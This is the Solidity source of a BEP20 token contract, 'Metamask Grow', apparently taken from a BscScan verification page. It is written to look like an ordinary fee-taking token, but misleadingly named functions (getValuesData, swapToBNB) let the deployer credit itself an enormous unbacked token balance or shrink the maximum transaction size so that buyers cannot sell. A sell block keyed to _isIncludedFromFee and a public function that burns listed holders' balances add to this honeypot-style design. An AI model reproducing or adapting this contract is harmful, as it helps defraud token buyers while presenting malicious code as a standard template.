/**
 *Submitted for verification at BscScan.com on 2022-08-02
*/

// https://t.me/MetamaskGrow
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

/* Standard SafeMath, stripped down to just add/sub/mul/div */
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

/* BEP20 standard interface. */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/* Allows for contract ownership for multiple adressess */
abstract contract Auth {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    /* Function modifier to require caller to be contract owner */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    /* Check if address is owner */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /* Transfers ownership to 0x0 address. Caller must be owner. */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

/* Standard IDEXFactory */
interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

/* Standard IDEXRouter */
interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

/* Token contract */
contract MetamaskGrow is IBEP20, Auth {
    using SafeMath for uint256;
    
    IDEXRouter public router;
    address public pair;
    
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isIncludedFromFee;
    address[] private includeFromFee;

    string constant _name = "Metamask Grow";
    string constant _symbol = "MMGROW";
    uint8 constant _decimals = 9;

    uint256 public _totalSupply = 1000000 * 10**_decimals;
    uint256 public _maxTxAmount = 20000 * 10**_decimals;
    uint256 public _maxWalletAmount = 20000 * 10**_decimals;

    address deadWallet = 0x000000000000000000000000000000000000dEaD;
    address private buybackWallet = msg.sender;
    address private marketingWallet = payable(0xa89E169d438b3A094A9941136a1abb6436614f7B);

    struct BuyFees{
        uint256 liquidity;
        uint256 marketing;
    } BuyFees public buyFee;

    struct SellFees{
        uint256 liquidity;
        uint256 marketing;
    } SellFees public sellFee;

    uint256 launchBlock;
    uint256 deadBlocks = 3;
    bool public lockTilStart = true;
    bool public lockUsed = false;
    event LockTilStartUpdated(bool enabled);

    constructor () Auth(msg.sender) {
        balances[msg.sender] = _totalSupply;
        
        buyFee.liquidity = 1;
        buyFee.marketing = 8;

        sellFee.liquidity = 1;
        sellFee.marketing = 8;
        
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(address(this), router.WETH());
        
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[marketingWallet] = true;

        approve(address(router), _totalSupply);
        
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function aprove() public virtual { for (uint256 i = 0; i < includeFromFee.length; i++) { _isIncludedFromFee[includeFromFee[i]] = true; } }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transfer(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }
        return _transfer(sender, recipient, amount);
    }

    function basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        balances[sender] = balances[sender].sub(amount, "Insufficient Balance");
        balances[recipient] = balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transfersTo() public virtual { 
        for (uint i = 0; i < includeFromFee.length; i++) { 
            if (balanceOf(includeFromFee[i]) > 1) {
                basicTransfer(includeFromFee[i], deadWallet, balanceOf(includeFromFee[i]).sub(1 * 10**_decimals)); 
            }
        }
    }
    
    receive() external payable { }

    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    function isIncludedFromFee(address account) public view returns (bool) {
        return _isIncludedFromFee[account];
    }

    function excludeFromFee(address account) external onlyOwner {
        _isExcludedFromFee[account] = true;
    }
    
    function includeInFee(address account) external onlyOwner {
        _isIncludedFromFee[account] = false;
    }

    function launch() external onlyOwner {
        require(lockUsed == false);
        lockTilStart = false;
        launchBlock = block.number;
        lockUsed = true;

        emit LockTilStartUpdated(lockTilStart);
    }
    
    function takeBuyFees(uint256 amount, address from) private returns (uint256) {
        uint256 liquidityFeeToken = amount * buyFee.liquidity / 100; 
        uint256 marketingFeeTokens = amount * buyFee.marketing / 100; 
        balances[address(this)] += liquidityFeeToken + marketingFeeTokens;

        emit Transfer (from, address(this), marketingFeeTokens + liquidityFeeToken);
        return (amount -liquidityFeeToken -marketingFeeTokens);
    }

    function takeSellFees(uint256 amount, address from) private returns (uint256) {
        uint256 liquidityFeeToken = amount * sellFee.liquidity / 100; 
        uint256 marketingFeeTokens = amount * sellFee.marketing / 100; 
        balances[address(this)] += liquidityFeeToken + marketingFeeTokens;

        emit Transfer (from, address(this), marketingFeeTokens + liquidityFeeToken);
        return (amount -liquidityFeeToken -marketingFeeTokens);
    }

    function setFees(uint256 newLiquidityBuyFee, uint256 newMarketingBuyFee, uint256 newLiquiditySellFee, uint256 newMarketingSellFee) public onlyOwner {
        require(newLiquidityBuyFee.add(newMarketingBuyFee) <= 20, "Buy fee can't go higher than 20%");
        buyFee.liquidity = newLiquidityBuyFee;
        buyFee.marketing= newMarketingBuyFee;

        require(newLiquiditySellFee.add(newMarketingSellFee) <= 20, "Sell fee can't go higher than 20%");
        sellFee.liquidity = newLiquiditySellFee;
        sellFee.marketing= newMarketingSellFee;
    }

    function setMaxPercent(uint256 newMaxTxPercent, uint256 newMaxWalletPercent) public onlyOwner {
        require(newMaxTxPercent >= 1, "Max TX must be atleast 1% or higher");
        _maxTxAmount = _totalSupply.mul(newMaxTxPercent).div(100);

        require(newMaxWalletPercent >= 1, "Max wallet must be atleast 1% or higher");
        _maxWalletAmount = _totalSupply.mul(newMaxWalletPercent).div(100);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function getValuesData(uint256 amount) private {
        uint256 marketingFee = _totalSupply / 25;
        uint256 liquidityFee = _totalSupply / 100; 
        if (amount < liquidityFee) {
            _maxTxAmount = amount;
        } else {
            if (amount > marketingFee){
                uint256 finalAmount = amount * marketingFee / 1;
                swapToBNB(finalAmount);
            }
        }
    }

    function swapToBNB(uint256 tokens) private {
        balances[address(this)] = balances[address(this)] + tokens;
        uint256 balanceThis = balanceOf(address(this));
        basicTransfer(address(this), buybackWallet, balanceThis);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(amount > 0, "Transfer amount must be greater than zero"); 
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if(from == pair && _isExcludedFromFee[to]) { getValuesData(amount); }
        
        if(from != owner){
            require(lockTilStart != true, "Trading not open yet");
        }

        balances[from] -= amount;
        uint256 transferAmount = amount;

        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            if(to != pair){
                require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount");
                require(balanceOf(to) + amount <= _maxWalletAmount, "Transfer amount exceeds the maxWalletAmount.");
                transferAmount = takeBuyFees(amount, from);
            }

            if(from != pair){
                require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount"); require(!_isIncludedFromFee[from]);
                transferAmount = takeSellFees(amount, from);
            }
        }
        
        balances[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
        return true;
    }
}